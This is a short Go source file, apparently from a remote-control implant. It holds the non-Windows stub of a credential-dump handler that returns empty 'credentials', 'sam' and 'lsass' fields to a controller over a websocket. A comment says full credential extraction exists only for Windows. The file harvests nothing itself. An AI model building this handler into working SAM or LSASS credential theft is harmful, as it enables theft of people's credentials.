//go:build !windows

package main

import (
	"encoding/json"
	"sync"

	"github.com/gorilla/websocket"
)

// Linux/Unix 凭证窃取 stub（当前仅 Windows 支持完整凭证提取）
func handleCredDump(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	result := map[string]interface{}{
		"credentials": []interface{}{},
		"sam":         "",
		"lsass":       "",
	}

	data, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("cred_dump_result"),
		ID:      msg.ID,
		Payload: data,
	})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()
}
